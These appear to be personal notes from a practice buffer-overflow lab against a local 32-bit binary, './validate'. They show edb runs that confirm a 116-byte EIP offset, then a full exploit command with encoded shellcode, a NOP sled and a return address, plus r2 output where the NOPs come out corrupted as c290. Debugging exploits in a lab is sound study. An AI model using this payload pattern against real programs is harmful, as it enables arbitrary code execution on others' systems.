
this one gives us the correct length - the same when we use normal chars with r2 - crashes on 42424242 as it should
```sh
┌──(kali㉿kali)-[~/bof]
└─$ edb --run ./validate `python -c 'print("A"*116+"B"*4)'`
Starting edb version: 1.3.0
Please Report Bugs & Requests At: https://github.com/eteran/edb-debugger/issues
Running Terminal:  "/usr/bin/xterm"
Terminal Args:  ("-title", "edb output", "-hold", "-e", "sh", "-c", "tty > /tmp/edb_temp_file_1307497572_211512;trap \"\" INT QUIT TSTP;exec<&-; exec>&-;while :; do sleep 3600; done")
Could not launch the desired terminal ["/usr/bin/xterm"], please check that it exists and you have proper permissions.
Terminal process has TTY:  ""
Debuggee is now 32 bit
Loading session file
Loading plugin-data
restoreComments
comparing versions: [5376] [4864]
Saving session file
```

crashes on c290c290 = this should have been nops but c2 is added for all nop bytes, similar oddities with other \xnn chars
```sh
┌──(kali㉿kali)-[~/bof]
└─$ edb --run ./validate `python -c "print('\xba\xf1\x5c\x77\x54\xd9\xc5\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x0b\x31\x50\x15\x03\x50\x15\x83\xe8\xfc\xe2\x04\x36\x7c\x0c\x7f\x95\xe4\xc4\x52\x79\x60\xf3\xc4\x52\x01\x94\x14\xc5\xca\x06\x7d\x7b\x9c\x24\x2f\x6b\x96\xaa\xcf\x6b\x88\xc8\xa6\x05\xf9\x7f\x50\xda\x52\xd3\x29\x3b\x91\x53'+'\x90'*(116-70)+'\xaf\x84\x04\x08')"`
Starting edb version: 1.3.0
Please Report Bugs & Requests At: https://github.com/eteran/edb-debugger/issues
Running Terminal:  "/usr/bin/xterm"
Terminal Args:  ("-title", "edb output", "-hold", "-e", "sh", "-c", "tty > /tmp/edb_temp_file_1308849160_211755;trap \"\" INT QUIT TSTP;exec<&-; exec>&-;while :; do sleep 3600; done")
Could not launch the desired terminal ["/usr/bin/xterm"], please check that it exists and you have proper permissions.
Terminal process has TTY:  ""
Debuggee is now 32 bit
Loading session file
Loading plugin-data
restoreComments
comparing versions: [5376] [4864]
Saving session file

```

r2 memory output
```sh
                                /esp                               
0xffffce18  c290 c290 c290 c290 c290 c290 c290 c290  ................
0xffffce28  c290 c290 c290 c290 c290 c290 c290 c290  ................
0xffffce38  c290 c290 c290 c290 c290 c290 c290 c290  ................
0xffffce48  c290 c290 c290 c290 c290 c290 c290 c290  ................
```
